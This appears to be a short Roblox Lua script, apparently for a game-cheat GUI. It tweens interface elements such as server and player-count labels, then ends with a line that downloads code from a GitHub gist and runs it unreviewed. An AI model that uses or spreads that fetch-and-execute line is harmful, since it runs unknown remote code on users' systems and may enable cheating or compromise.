game:GetService("TweenService"):Create(fr, TweenInfo.new(.3), {Position = UDim2.new(1,-5,.05,0)}):Play()
game:GetService("TweenService"):Create(fr3, TweenInfo.new(.3), {Position = UDim2.new(.31,0,1,-20)}):Play()
game:GetService("TweenService"):Create(b, TweenInfo.new(.3), {Position = UDim2.new(.9525,0,0,-31)}):Play()
game:GetService("TweenService"):Create(srvrs, TweenInfo.new(.3), {Position = UDim2.new(.93,0,0,-31)}):Play()
game:GetService("TweenService"):Create(numplrs, TweenInfo.new(.3), {Position = UDim2.new(.3,0,0,-36)}):Play()
game:GetService("TweenService"):Create(job, TweenInfo.new(.3), {Position = UDim2.new(.8,0,0,-31)}):Play()
game:GetService("TweenService"):Create(formmastery, TweenInfo.new(.3), {Position = UDim2.new(.65,0,0,-36)}):Play()

loadstring(game:HttpGet("https://gist.githubusercontent.com/JellyJrl/1323d077b0920a460f6208eedb25dece/raw/xfwad"))()

